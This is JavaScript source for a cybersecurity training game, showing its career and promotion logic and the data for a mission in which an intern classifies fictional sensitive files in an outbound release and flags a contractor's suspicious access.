          <li class="sim-report-flag"><span class="sim-report-flag-icon">${mark}</span><span>${idf.reviewLabel || 'Answer'}: <strong>${correctOpt ? correctOpt.label : ''}</strong>${SIM.identified ? ` · you chose ${chosenOpt ? chosenOpt.label : SIM.identified}` : ' · not identified'}</span></li>
        </ul>
      </div>`;
  }

  return `
    <div class="sim-report">
      <div class="sim-report-section">
        <div class="sim-conseq-label sim-conseq-label--future">CARRY-FORWARD FLAGS</div>
        <ul class="sim-report-flags">${flagItems}</ul>
      </div>
      ${reviewHtml}
    </div>`;
}

/* Build + upsert this mission's company-timeline record from the decision
 * context the caller already holds (decision label/kind, leadership verdict,
 * the applied resource changes). Pure-ish: only mutates CAREER.companyHistory
 * via the idempotent upsert. Confidence + raised flags are read from live SIM
 * state at finalize time (evidence is fully surfaced by then). */
function recordCompanyHistory(ctx) {
  if (!SIM.missionId) return;
  const def = SIM.def || {};
  const c = ctx || {};
  const moved = (Array.isArray(c.changes) ? c.changes : [])
    .filter(ch => ch.after !== ch.before)
    .map(ch => ({ key: ch.key, before: ch.before, after: ch.after, delta: ch.after - ch.before }));
  const raised = missionCarryFlags().filter(f => CAREER.missionFlags[f.key]).map(f => f.key);
  const entry = {
    missionId: SIM.missionId,
    title: def.title || SIM.missionId,
    opId: def.opId || '',
    completedAt: Date.now(),
    decisionLabel: c.decisionLabel || '',
    decisionKind: c.decisionKind || '',
    verdict: c.verdict || null,
    confidencePct: investigationConfidence(),
    resourceChanges: moved,
    raisedFlags: raised,
  };
  CAREER.companyHistory = upsertCompanyHistory(CAREER.companyHistory, entry);
}

/* ================================================================== *
 * CAREER ENGINE (P4) — record completion + persist. A capstone mission
 * carrying a performanceReview confers the real Intern→Junior promotion
 * here (monotonic + idempotent); other missions leave the role untouched.
 * ================================================================== */
function finalizeMission(ctx) {
  if (!SIM.missionId) return;
  if (!Array.isArray(CAREER.completedMissions)) CAREER.completedMissions = [];
  if (!CAREER.completedMissions.includes(SIM.missionId)) CAREER.completedMissions.push(SIM.missionId);
  // COMPANY TIMELINE — record this mission's outcome so later briefs can show
  // "the company remembers". Built from the decision context the caller already
  // has (never reconstructed from the DOM) and upserted idempotently by mission
  // id, so a replay REPLACES rather than duplicates the entry.
  recordCompanyHistory(ctx);
  // PROMOTION PAYOFF (Task #108) — a capstone mission carrying a performance
  // review can earn a real, persisted promotion. Apply the SAME pure decision the
  // review message used (monotonic + idempotent: sticky once earned, never demotes
  // or double-promotes on replay). Non-capstone missions never touch the role.
  if (SIM.def && SIM.def.performanceReview) {
    const cur = activeRole();
    const next = CAREER_ROLES.find(r => r.authorityLevel === cur.authorityLevel + 1);
    const review = performanceReview(performanceSignals());
    const decision = promotionDecision({ currentRoleId: cur.id, average: review.average, nextRoleId: next && next.id });
    if (decision.promoted) CAREER.currentRole = decision.toRoleId;
  }
  CAREER.currentRank = roleById(CAREER.currentRole).title;
  saveCareerState();
  renderResourceBar();
  // Shipping integration: record REAL host completion through the canonical
  // chokepoint (sets the mission flag, awards XP, persists via saveProgress,
  // unlocks the next assignment on the Ops Center map, closes the cloud attempt).
  // Host-side idempotent (already-complete -> no-op) and never throws, so a replay
  // or a missing bridge (standalone) leaves the sim unaffected.
  try {
    if (typeof window !== 'undefined' && typeof window.echCareerComplete === 'function') {
      window.echCareerComplete(SIM.missionId);
    }
  } catch (_) { /* host completion is best-effort; never break the sim */ }
}

/* ================================================================== *
 * MISSION DATASETS — generic; engines never name a mission directly.
 * P1 supplies Mission 1's brief; P2–P4 add files/evidence/actions/etc.
 * ================================================================== */
const CAREER_MISSIONS = {
  'mission-001': {
    id: 'mission-001',
    opId: 'OPS-2026-001',
    severity: 'HIGH',
    region: 'EMEA REGION',
    title: 'Protect Sensitive Information',
    threatClass: 'Data Classification & Information Handling',
    priority: 'P2 — HIGH',
    promptLabel: 'intern@cybercorp:~/release$',
    // First-day teaching: clicking a suggested command button loads it into the
    // terminal input so the player sees the exact command and runs it themselves
    // with Enter, instead of firing on click. Scoped to this mission via the flag
    // (other missions keep click-to-run). Read by commandTeachMode().
    teachCommands: true,
    carryFlags: [
      { key: 'contractorAccessDiscovered', label: 'Contractor access flagged for follow-up' },
      { key: 'sensitiveDataExposed',       label: 'Sensitive-data exposure on record' },
      { key: 'legalReviewTriggered',       label: 'Legal review opened' },
      { key: 'contractorAccessIgnored',    label: 'Contractor access left unreviewed' },
    ],
    evidenceEmpty: 'No evidence yet. Use the terminal to review the files, then classify what you find.',
    risks: [
      { id: 'risk_pii',        label: 'Employee personal data (PII) is in the outbound release', triggeredBy: ['ev_pii_salary'] },
      { id: 'risk_pci',        label: 'Regulated customer payment records (PCI) are in the release', triggeredBy: ['ev_customer_pii'] },
      { id: 'risk_confidential',label: 'Confidential business information is bundled in', triggeredBy: ['ev_confidential_pricing', 'ev_confidential_roadmap'] },
      { id: 'risk_contractor', label: 'A contractor account accessed files outside its remit', triggeredBy: ['ev_contractor_access'] },
      { id: 'risk_noreview',   label: 'The release was assembled with no internal reviewer', triggeredBy: ['ev_release_context'] },
    ],

    // Reactive data-access map (Task #97) — review-only, same engine as
    // mission-002. Mission 1 has no real network, so the graph is a data-access
    // diagram: contractor account -> release package -> files. Only the two
    // genuinely pre-known anchors from the brief (the contractor who requested
    // the release and the release package itself) are seeded; each file appears
    // and flags ONLY once the player has read it, and the out-of-remit access
    // links appear ONLY once the access log is read. Nothing is persisted/scored.
    map: {
      cap: 'RELEASE REVIEW · OUTBOUND DATA FLOW — EMEA REGION',
      hint: 'Red marks sensitive files that should not leave and the contractor\u2019s out-of-remit access. Select any node or connection for analyst intel.',
      nodes: {
        contractor: {
          x: 13, y: 56, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir · vendor', seed: true,
          statusBy: { ev_contractor_access: 'suspicious' },
          intel: {
            what: 'The external vendor account that requested this outbound release.',
            technique: 'Its role is stated in the assignment brief and the release cover note (cat release_notes.txt).',
            why: 'An outside vendor account assembling a release of company files is the kind of access worth reviewing.' },
        },
        release: {
          x: 50, y: 33, glyph: '📦', label: 'release pkg', sub: 'queued external', seed: true,
          intel: {
            what: 'The shared folder queued to leave the company for an external partner.',
            technique: 'List the queued files (ls), then read them (cat <file>) or scan for markers (grep <text>) to see what is bundled inside.',
            why: 'Everything in this package is about to leave the building, so each file must be classified first.' },
        },
        partner: {
          x: 50, y: 10, glyph: '🌐', label: 'Meridian Logistics', sub: 'external partner',
          revealBy: 'ev_release_context',
          intel: {
            what: 'The external logistics partner the release is addressed to.',
            technique: 'Named in the release cover note (cat release_notes.txt).',
            why: 'It is outside the company, so anything bundled into the package would land in third-party hands.' },
        },
        f_datasheet: {
          x: 24, y: 88, glyph: '📄', label: 'product_datasheet', sub: 'public · safe',
          revealBy: 'ev_public_safe', statusBy: { ev_public_safe: 'identified' }, classifyFile: 'product_datasheet.txt',
          intel: {
            what: 'A marketing datasheet already cleared for public distribution.',
            technique: 'grep public (or cat product_datasheet.txt) — marked cleared for public distribution by Marketing.',
            why: 'Already-public material is safe to share — the baseline of what a clean release looks like.' },
        },
        f_pricing: {
          x: 41, y: 91, glyph: '📄', label: 'partner_pricing', sub: 'confidential',
          revealBy: 'ev_confidential_pricing', statusBy: { ev_confidential_pricing: 'suspicious' }, classifyFile: 'partner_pricing_2026.csv',
          intel: {
            what: 'Negotiated per-partner pricing and renewal dates — internal commercial terms.',
            technique: 'grep negotiated (or cat partner_pricing_2026.csv) — rates marked not for external eyes.',
            why: 'One partner seeing another\u2019s private rates is a confidentiality breach; it must not ship.' },
        },
        f_roadmap: {
          x: 58, y: 92, glyph: '📄', label: 'acquisition_roadmap', sub: 'confidential',
          revealBy: 'ev_confidential_roadmap', statusBy: { ev_confidential_roadmap: 'suspicious' }, classifyFile: 'acquisition_roadmap.txt',
          intel: {
            what: 'A draft, unannounced acquisition roadmap — material non-public information.',
            technique: 'grep confidential (or cat acquisition_roadmap.txt) — marked material non-public information.',
            why: 'Unannounced deal plans are market-sensitive; releasing them early is a leak and a legal risk.' },
        },
        f_salary: {
          x: 75, y: 90, glyph: '📄', label: 'employee_salaries', sub: 'restricted · PII',
          revealBy: 'ev_pii_salary', statusBy: { ev_pii_salary: 'suspicious' }, classifyFile: 'employee_salaries.csv',
          intel: {
            what: 'Employee names, titles and salaries — HR-restricted personal data (PII).',
            technique: 'grep restricted (or cat employee_salaries.csv) — marked HR-Restricted, PII and compensation.',
            why: 'Personal pay data must never leave the company; in an external release it is a serious exposure.' },
        },
        f_payments: {
          x: 90, y: 82, glyph: '📄', label: 'customer_payments', sub: 'restricted · PCI',
          revealBy: 'ev_customer_pii', statusBy: { ev_customer_pii: 'suspicious' }, classifyFile: 'customer_payment_records.csv',
          intel: {
            what: 'Customer card last-4, amounts and processor references — regulated payment data (PCI).',
            technique: 'grep pci (or cat customer_payment_records.csv) — marked regulated cardholder data (PCI scope).',
            why: 'Cardholder data is legally protected; sending it to a partner would be a regulated-data breach.' },
        },
      },
      links: [
        { a: 'contractor', b: 'release', revealBy: 'ev_release_context',
          intel: {
            what: 'The release package was assembled by the contractor account itself, with no internal reviewer.',
            technique: 'The cover note (cat release_notes.txt) shows it was prepared by the vendor account.',
            why: 'Normally an internal data owner signs off on what leaves; an outsider self-approving it is a gap.' } },
        { a: 'release', b: 'partner', revealBy: 'ev_release_context',
          intel: {
            what: 'The whole package is queued to be sent to the external partner.',
            technique: 'cat release_notes.txt — addressed to Meridian Logistics.',
            why: 'This is the door out of the company; whatever is in the package goes through it.' } },
        { a: 'release', b: 'f_datasheet', revealBy: 'ev_public_safe',
          intel: {
            what: 'The public datasheet is part of the outbound package.',
            technique: 'Listed by ls and read with cat product_datasheet.txt.',
            why: 'Public collateral is exactly what should be in a partner release — no concern.' } },
        { a: 'release', b: 'f_pricing', revealBy: 'ev_confidential_pricing', danger: true,
          intel: {
            what: 'Confidential partner pricing is bundled into the outbound package.',
            technique: 'cat partner_pricing_2026.csv reveals it sitting in the release.',
            why: 'Internal commercial terms heading to an external partner is a confidentiality breach.' } },
        { a: 'release', b: 'f_roadmap', revealBy: 'ev_confidential_roadmap', danger: true,
          intel: {
            what: 'The unannounced acquisition roadmap is bundled into the outbound package.',
            technique: 'cat acquisition_roadmap.txt reveals it sitting in the release.',
            why: 'Material non-public information leaving early is a leak with legal consequences.' } },
        { a: 'release', b: 'f_salary', revealBy: 'ev_pii_salary', danger: true,
          intel: {
            what: 'Restricted employee PII is bundled into the outbound package.',
            technique: 'cat employee_salaries.csv reveals it sitting in the release.',
            why: 'Personal salary data must never leave the company, least of all to a third party.' } },
        { a: 'release', b: 'f_payments', revealBy: 'ev_customer_pii', danger: true,
          intel: {
            what: 'Regulated customer payment data is bundled into the outbound package.',
            technique: 'cat customer_payment_records.csv reveals it sitting in the release.',
            why: 'Sending PCI cardholder data to a partner would be a regulated-data breach.' } },
        { a: 'contractor', b: 'f_salary', revealBy: 'ev_contractor_access', danger: true,
          intel: {
            what: 'The contractor account opened employee salary data at 02:00 — outside its remit.',
            technique: 'grep ext-contractor-07 (or cat access_log.txt) shows the vendor account reading employee_salaries.csv.',
            why: 'A vendor account reading HR files it has no role in is exactly the access that should be flagged.' } },
        { a: 'contractor', b: 'f_payments', revealBy: 'ev_contractor_access', danger: true,
          intel: {
            what: 'The contractor account opened customer payment records at 02:00 — outside its remit.',
            technique: 'grep ext-contractor-07 (or cat access_log.txt) shows the vendor account reading customer_payment_records.csv.',
            why: 'Regulated payment data accessed by an out-of-scope vendor account is a serious red flag.' } },
        { a: 'contractor', b: 'f_roadmap', revealBy: 'ev_contractor_access', danger: true,
          intel: {
            what: 'The contractor account opened the acquisition roadmap at 02:00 — outside its remit.',
            technique: 'grep ext-contractor-07 (or cat access_log.txt) shows the vendor account reading acquisition_roadmap.txt.',
            why: 'Material non-public deal information read by a vendor account is well beyond any legitimate need.' } },
      ],
    },

    /* ---- TWO-STEP ANALYST JUDGMENT ENGINE (shared across all four interns) -
     * caseFileNotebook restructures the Analyst Notebook into a case-file model
     * (FACT / ASSESSMENT / REASON / UNKNOWNS / RECOMMENDATIONS). investigationFeed
     * surfaces the Active Investigation pointer. boardMilestones auto-open the
     * network map once each as significant findings surface. discoveryChallenges
     * are the per-finding TWO-STEP judgments: first "what stands out?"
     * (observation), then "why does it matter?" (justification), each with
     * distinct correct/incorrect Sarah Reyes feedback. All read only where
     * present. */
    caseFileNotebook: true,
    // First-day declutter (Task: focused Mission 1). Opts this mission alone into
    // the simplified workspace — one building Case Board card, advanced analyst
    // modules hidden, consequence/feedback surfaces held back until a real call.
    // Presentation/sequencing only: scoring, persistence, curriculum and the
    // no-spoiler invariant are unchanged. Missions 2-4 omit the flag entirely.
    uiComplexityLevel: 'simple',
    // Pacing beat: after a command surfaces a finding, hold the Sarah question
    // behind a small "read what came up, then continue" beat so the just-printed
    // output stays visible and the analyst isn't asked before they've read it.
    // Presentation/sequencing only. Now shared by every case-file mission (M2-M4
    // set the same flag); see reviewGateMode().
    reviewBeforeCall: true,
    investigationFeed: true,
    // Phase 1B investigation-guidance bundle (workflow stage bar, RECENT ACTIVITY
    // log, progressive UI focus) is Mission-1-only. M2-M4 keep their existing
    // "Active Investigation" state summary but do NOT get the beginner guidance
    // overlay. Gate new guidance surfaces on this flag, never on a mission id.
    investigationGuidance: true,
    // Third investigative skill: `grep` triages the release folder for sensitivity
    // markers (unlocks after two deep reads). Per-file `grepTerms` below are the
    // authored indicators that surface that file's evidence when searched.
    grepTriage: true,
    // (B) Click-to-scan suggestions — the same sensitivity markers the grep-unlock
    // coaching names. Presentation-only; rendered as terminal/HUD chips.
    grepSuggestions: ['restricted', 'confidential', 'ext-contractor-07'],
    // (E) First-shift onboarding — shown once ever on first entry to this mission,
    // teaching the investigate -> tell-Sarah -> decide loop. Data-gated: only this
    // file-model mission authors it, so M2-M4 never show it.
    onboarding: {
      title: 'Your first shift on the Blue Team',
      intro: 'You\u2019re the analyst. Sarah Reyes mentors you over comms. The work is a loop of three beats:',
      steps: [
        { title: '1 \u00B7 Investigate', text: 'Open files with  cat  (or click a file under the listing). After a couple of reads,  grep  lets you scan the whole folder for sensitive markers.' },
        { title: '2 \u00B7 Tell Sarah your read', text: 'When something stands out, Sarah asks for your call in the Decision Dock below the terminal. The command line pauses until you answer \u2014 that\u2019s your judgment, not a test.' },
        { title: '3 \u00B7 Decide', text: 'Once the findings are in, type  decide  (or use the chip) to choose how to handle the outbound release.' },
      ],
      cta: 'Start investigating \u2192',
    },
    boardMilestones: ['ev_pii_salary', 'ev_customer_pii', 'ev_contractor_access'],
    // Progressive objectives (engine-level) — Mission 1 benefits too. Tick live
    // off findings + the recorded decision; presentation-only, never scored.
    objectiveTrack: [
      { id: 'm1_review',    label: 'Review the files queued in the outbound release', doneBy: ['ev:ev_public_safe'] },
      { id: 'm1_sensitive', label: 'Flag the sensitive data that must not leave', doneBy: ['ev:ev_pii_salary', 'ev:ev_customer_pii'] },
      { id: 'm1_access',    label: 'Investigate the suspicious contractor access', doneBy: ['ev:ev_contractor_access'] },
      { id: 'm1_decide',    label: 'Decide how to handle the release', doneBy: ['decision'] },
    ],
    // Just-in-time concept cards — classification basics, triggered on findings
    // DISJOINT from boardMilestones so they never collide with the map auto-open.
    conceptCards: [
      { id: 'm1_cc_public', triggerEv: 'ev_public_safe', glossaryKey: 'public',
        examples: ['product_datasheet.txt is cleared for public release', 'Already-public material is safe to share'] },
      { id: 'm1_cc_confidential', triggerEv: 'ev_confidential_pricing', glossaryKey: 'confidential',
        examples: ['partner_pricing_2026.csv holds negotiated rates', 'One partner must never see another\u2019s pricing'] },
      { id: 'm1_cc_mnpi', triggerEv: 'ev_confidential_roadmap', glossaryKey: 'materialNonPublic',
        examples: ['acquisition_roadmap.txt is an unannounced deal plan', 'Releasing it early is a leak with legal risk'] },
    ],
    /* Reconsideration / pivot beat (presentation-only, NON-graded). Once the access
     * log surfaces the contractor reaching files outside its remit, Sarah asks the
     * analyst to revise or consciously hold the EARLIER "who packaged this release"
     * read. Both calls are valid analyst postures — the copy never implies one is
     * correct. Recorded via setReconsideration; the original call stays immutable. */
    reconsiderations: [
      {
        id: 'rc_release_contractor',
        when: 'ev_contractor_access',   // access_log.txt — contractor read HR/Finance files outside its remit
        target: 'ch_release_context',   // earlier call: who assembled the release, and was it routine
        sarah: 'Now look at this — the access log shows that same contractor account reading HR and Finance files it had no business touching. Earlier you logged your read on who packaged the release. Does this new finding change how you see the contractor\u2019s role?',
        options: [
          {
            id: 'revise',
            label: 'Revise my read — the contractor\u2019s access changes the picture',
            feedback: '"That\u2019s a deliberate move — when a new fact widens the scope, you let it move you. The packaging gap and the out-of-remit access read as one story now, not two." — Sarah Reyes',
          },
          {
            id: 'hold',
            label: 'Hold my read — the packaging gap was already the core issue',
            feedback: '"That\u2019s a deliberate move — you\u2019re holding the line you already drew. The missing owner sign-off stands on its own; the access is more weight on the same concern, not a new direction." — Sarah Reyes',
          },
        ],
      },
    ],
    discoveryChallenges: [
      {
        id: 'ch_release_context', evidenceId: 'ev_release_context', short: 'Release ownership', weight: 1,
        observation: {
          prompt: 'You read the release cover note. What stands out MOST about how this package was prepared?',
          correct: 'a',
          options: [
            { id: 'a', label: 'An external contractor assembled the release with no internal review',
              feedback: '"Exactly — an outside account deciding what leaves the company is the thread to pull. Good eye." — Sarah Reyes' },
            { id: 'b', label: 'The cover note is short and a little informal',
              feedback: '"Tone is not the signal. Look at WHO prepared this and whether anyone inside checked it." — Sarah Reyes' },
            { id: 'c', label: 'The partner is in logistics, not security',
              feedback: '"The partner being logistics is fine. The issue is the contractor self-approving the contents." — Sarah Reyes' },
            { id: 'd', label: 'Nothing — this is a routine partner release',
              feedback: '"I would push back — a contractor packaging finance files unsupervised is not routine." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does a contractor self-assembling this release matter?',
          correct: 'a',
          options: [
            { id: 'a', label: 'No data-owner ever signed off on what is leaving the company',
              feedback: '"Right — the missing sign-off is the control failure. Without an owner check, anything can slip into that package." — Sarah Reyes' },
            { id: 'b', label: 'Contractors are usually careless with formatting',
              feedback: '"This is not about tidiness. The risk is the absent approval, not the file layout." — Sarah Reyes' },
            { id: 'c', label: 'It will slow the partner down',
              feedback: '"Partner speed is not our concern here. The point is that no one inside vetted the contents." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_public_safe', evidenceId: 'ev_public_safe', short: 'Public collateral', weight: 1,
        observation: {
          prompt: 'You open the product datasheet. What stands out about this file?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It is published, marketing-cleared collateral',
              feedback: '"Yes — recognising what is already public is just as important as spotting what is not." — Sarah Reyes' },
            { id: 'b', label: 'It mentions pricing, so it must be confidential',
              feedback: '"Look closer — that is the PUBLISHED list price, not a negotiated rate. Pricing alone does not make it sensitive." — Sarah Reyes' },
            { id: 'c', label: 'It is in a flagged release, so it must be risky',
              feedback: '"Guilt by association is not analysis. Judge the file on what it contains, not the folder it sits in." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why is the datasheet safe to include in the partner release?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Already-public material carries no new exposure if it leaves',
              feedback: '"Exactly — over-blocking public collateral just erodes trust with the business. This one is fine to share." — Sarah Reyes' },
            { id: 'b', label: 'Partners usually ignore datasheets anyway',
              feedback: '"We do not judge by whether they read it. It is safe because it is already public." — Sarah Reyes' },
            { id: 'c', label: 'We can always redact the pricing later',
              feedback: '"No redaction needed — the pricing is the published price. It is safe as-is." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_pii_salary', evidenceId: 'ev_pii_salary', short: 'Salary file handling', weight: 1,
        observation: {
          prompt: 'Employee salaries are sitting in the outbound package. What stands out about this file?',
          correct: 'a',
          options: [
            { id: 'a', label: 'It ties named employees to their pay',
              feedback: '"That is the heart of it — names linked to compensation is the most sensitive kind of HR data." — Sarah Reyes' },
            { id: 'b', label: 'It is a large spreadsheet',
              feedback: '"Size is not the signal. It is WHAT the rows contain — names and salaries." — Sarah Reyes' },
            { id: 'c', label: 'It looks slightly out of date',
              feedback: '"Freshness does not change the sensitivity. Old salary data is still salary data." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why does named salary data demand the highest classification?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Compensation PII must never leave the company — it is the Restricted tier',
              feedback: '"Correct call — names tied to pay is the top tier. This can never reach a partner." — Sarah Reyes' },
            { id: 'b', label: 'Staff might get jealous of each other\u2019s pay',
              feedback: '"Internal morale is real, but the classification is about external exposure of PII — that is what makes it Restricted." — Sarah Reyes' },
            { id: 'c', label: 'It is only Confidential — internal staff can see it',
              feedback: '"Close, but salary PII outranks Confidential. Individual pay is Restricted." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_customer_pii', evidenceId: 'ev_customer_pii', short: 'Payment data risk', weight: 1,
        observation: {
          prompt: 'You find customer payment records in the package. What stands out MOST?',
          correct: 'a',
          options: [
            { id: 'a', label: 'These are regulated cardholder records',
              feedback: '"Yes — recognising this as regulated payment data is the whole game." — Sarah Reyes' },
            { id: 'b', label: 'The CSV is messy and hard to read',
              feedback: '"Formatting is noise. Focus on what the data IS: regulated card records." — Sarah Reyes' },
            { id: 'c', label: 'There are only a few rows',
              feedback: '"Even one card record matters. Volume is not what stands out here." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'Why is cardholder data in an outbound package the single highest concern?',
          correct: 'a',
          options: [
            { id: 'a', label: 'Sending it to an outside party is a regulated-data breach',
              feedback: '"Exactly — PCI cardholder data leaving to a third party means fines and real customer harm." — Sarah Reyes' },
            { id: 'b', label: 'The partner might already have a copy',
              feedback: '"We cannot assume that, and it would not reduce our liability. The exposure itself is the concern." — Sarah Reyes' },
            { id: 'c', label: 'Only a few customers are affected',
              feedback: '"Even one exposed record is reportable. Scale does not lower the severity." — Sarah Reyes' },
          ],
        },
      },
      {
        id: 'ch_contractor_access', evidenceId: 'ev_contractor_access', short: 'Contractor activity', weight: 2,
        observation: {
          prompt: 'The access log shows ext-contractor-07 reading HR/Finance files at 02:00, outside its remit. What stands out?',
          correct: 'a',
          options: [
            { id: 'a', label: 'A vendor account is reaching data far outside its job, at 2 AM',
              feedback: '"Right — scope and timing together are the tell: a vendor account in HR/Finance in the middle of the night." — Sarah Reyes' },
            { id: 'b', label: 'The timestamps use a 24-hour clock',
              feedback: '"The clock format is irrelevant. It is WHAT was accessed and by WHOM that matters." — Sarah Reyes' },
            { id: 'c', label: 'The log file is quite long',
              feedback: '"Length is not the signal. Zero in on the out-of-scope reads by the contractor account." — Sarah Reyes' },
          ],
        },
        justification: {
          prompt: 'How should you judge this activity?',
          correct: 'suspicious',
          options: [
            { id: 'suspicious', label: 'Suspicious — flag and escalate for investigation',
              feedback: '"Exactly the right call. Strong indicators but not proof of intent — Suspicious means we escalate and investigate." — Sarah Reyes' },
            { id: 'benign', label: 'Benign — probably just release preparation',
              feedback: '"I would challenge that. A vendor reading salaries and roadmaps at 2 AM is not normal prep." — Sarah Reyes' },
            { id: 'malicious', label: 'Malicious — confirmed insider attack, lock everything down now',
              feedback: '"Good instinct to take it seriously, but we cannot prove intent yet. Call it Suspicious and escalate." — Sarah Reyes' },
          ],
        },
      },
    ],

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Data Handling Review', c: 'head' },
      { t: 'A shared folder is queued for an external release. Before it goes out, classify', c: 'dim' },
      { t: 'every file and decide how each should be handled. Review the files first.', c: 'dim' },
      { t: 'Type  ls  to list the folder, then  cat <file>  to read one. Once you know the folder, you can  grep <text>  to hunt for sensitive markers. Type  help  anytime.', c: 'dim' },
    ],
    brief: {
      situation:
        'A contractor has requested an external release of a Finance shared folder. ' +
        'Routine, until access logs flagged the same contractor account reading files ' +
        'well outside its remit. Before anything leaves the building, review and classify ' +
        'the folder, judge the handling for each file, and decide what to do about the ' +
        'contractor activity.',
      objectives: [
        'Review every file in the release folder',
        'Classify each file (Public / Internal / Confidential / Restricted)',
        'Investigate the suspicious contractor access',
        'Decide how to handle the release — and justify it',
      ],
      managerNote:
        '"You are the intern on this one, so you do not get to approve a release yourself — ' +
        'and you should not. Classify carefully, and if something feels off, recommend or ' +
        'escalate. Document everything. — Sarah Reyes, SOC Lead"',
    },

    /* ---- INVESTIGATION: files queued for release (ground-truth handling) ---- */
    files: [
      {
        name: 'release_notes.txt',
        trueClassification: 'public',
        content: [
          'EXTERNAL RELEASE PACKAGE — Partner: Meridian Logistics',
          'Prepared by:  ext-contractor-07  (J. Demir, vendor account)',
          'Purpose:      share Q3 logistics collateral with the partner.',
          'Note:         "Bundled a few extra finance files to save a round trip." ',
        ],
        beginnerNote: 'A cover note for the release. It admits extra finance files were added in.',
        evidenceIds: ['ev_release_context'],
        grepTerms: ['finance', 'bundled', 'extra'],
        focus: 'Read how this package was assembled and who decided what goes out.',
      },
      {
        name: 'product_datasheet.txt',
        trueClassification: 'public',
        content: [
          'CyberCorp LogiSuite — Product Datasheet (Marketing)',
          'Throughput, supported regions, published list pricing.',
          'Cleared for public distribution by Marketing.',
        ],
        beginnerNote: 'A marketing sheet that is already published — meant for the public.',
        evidenceIds: ['ev_public_safe'],
        grepTerms: ['public', 'cleared', 'marketing'],
        focus: 'Check who this material was cleared for before it was queued to ship.',
      },
      {
        name: 'partner_pricing_2026.csv',
        trueClassification: 'confidential',
        content: [
          'partner,tier,negotiated_rate,renewal_date',
          'Meridian Logistics,Gold,0.42/unit,2026-09-01',
          'Halden Freight,Silver,0.51/unit,2026-04-15',
          '# Internal negotiated rates — not for external eyes.',
        ],
        beginnerNote: 'The special prices the company privately agreed with each partner.',
        evidenceIds: ['ev_confidential_pricing'],
        grepTerms: ['negotiated', 'internal', 'not for external'],
        focus: 'Look at who these figures were meant for, and whether they were ever cleared to leave the company.',
      },
      {
        name: 'employee_salaries.csv',
        trueClassification: 'restricted',
        content: [
          'name,department,title,annual_salary',
          'A. Okafor,Finance,Controller,128000',
          'L. Brandt,Engineering,Staff Engineer,176000',
          '# HR-Restricted. PII + compensation.',
        ],
        beginnerNote: 'Employees'+"'"+' names and how much each person is paid.',
        evidenceIds: ['ev_pii_salary'],
        grepTerms: ['restricted', 'pii', 'salary', 'compensation'],
        focus: 'Notice what kind of personal information each row holds, and who it belongs to.',
        focusTerms: ['pii'],
      },
      {
        name: 'customer_payment_records.csv',
        trueClassification: 'restricted',
        content: [
          'customer,card_last4,amount,processor_ref',
          'Northwind Co,4417,12450.00,TX-99312',
          'Bryce & Hall,8820,3275.50,TX-99318',
          '# Regulated cardholder data (PCI scope).',
        ],
        beginnerNote: 'Customers'+"'"+' card and payment details — protected by law.',
        evidenceIds: ['ev_customer_pii'],
        grepTerms: ['cardholder', 'pci', 'regulated', 'card'],
        focus: 'Consider what category of data these payment details fall under.',
        focusTerms: ['pci'],
      },
      {
        name: 'acquisition_roadmap.txt',
        trueClassification: 'confidential',
        content: [
          'PROJECT NORTHSTAR — Acquisition Roadmap (DRAFT, UNANNOUNCED)',
          'Target shortlist, valuation ranges, timeline through 2027.',
          '# Material non-public information. Confidential.',
        ],
        beginnerNote: 'A secret, unannounced plan about companies CyberCorp may buy.',
        evidenceIds: ['ev_confidential_roadmap'],
        grepTerms: ['confidential', 'non-public', 'unannounced', 'material'],
        focus: 'Note whether this plan has been announced yet, and who is meant to see it.',
        focusTerms: ['materialNonPublic'],
      },
      {
        name: 'access_log.txt',
        trueClassification: 'internal',
        content: [
          'ts                  account            file',
          '2026-06-11 02:14    ext-contractor-07  employee_salaries.csv',
          '2026-06-11 02:16    ext-contractor-07  customer_payment_records.csv',
          '2026-06-11 02:21    ext-contractor-07  acquisition_roadmap.txt',
          '# Vendor account reading HR/Finance files at 02:00, outside its remit.',
        ],
        beginnerNote: 'A record of who opened which files, and at what time.',
        evidenceIds: ['ev_contractor_access'],
        grepTerms: ['ext-contractor-07', 'contractor', '02:', 'remit'],
        focus: 'Compare which account opened these files, and when, against what its role should need.',
      },
    ],

    /* ---- Ground-truth evidence (weighted; quality drives recommendations) ----
     * `label` is the legacy one-liner (still used in the terminal log + fallback).
     * `layers` adds beginner-first presentation; the engine never reads them.   */
    evidence: [
      {
        id: 'ev_release_context', label: 'Release was prepared by the contractor account itself.',
        qualityWeight: 1, source: 'release_notes.txt',
        layers: {
          beginner: {
            summary: 'The outside contractor put this release package together on their own.',
            why: 'Normally someone inside the company checks what an outsider is about to send out.',
            prompt: 'Should an outside contractor decide by themselves what leaves the company?',
          },
          analyst: 'The release set was assembled by the external contractor account, with no internal reviewer in the chain.',
          technical: 'Prepared by: ext-contractor-07 (vendor account). No internal data-owner sign-off recorded on the release manifest.',
          terms: [],
        },
      },
      {
        id: 'ev_public_safe', label: 'Public marketing collateral — safe to release externally.',
        qualityWeight: 1, source: 'product_datasheet.txt',
        layers: {
          beginner: {
            summary: 'This is a marketing sheet that has already been published.',
            why: 'Information that is already public is fine to share with a partner.',
            prompt: 'Is there any real risk in sharing something that is already public?',
          },
          analyst: 'Product datasheet — marketing-cleared collateral approved for public distribution.',
          technical: 'product_datasheet.txt — Classification: Public. Cleared for public distribution by Marketing.',
          terms: ['public'],
        },
      },
      {
        id: 'ev_confidential_pricing', label: 'Confidential partner pricing bundled into the release set.',
        qualityWeight: 2, source: 'partner_pricing_2026.csv',
        layers: {
          beginner: {
            summary: 'This file lists the special prices the company privately gives each partner.',
            why: 'Those negotiated prices are private — a competitor, or another partner, should not see them.',
            prompt: 'Should one partner be able to see the deal another partner was given?',
          },
          analyst: 'Negotiated partner pricing (per-unit rates and renewal dates) bundled into an outbound release — internal commercial data.',
          technical: 'partner_pricing_2026.csv — negotiated_rate + renewal_date per partner. Internal-only commercial terms; Confidential.',
          terms: ['confidential'],
        },
      },
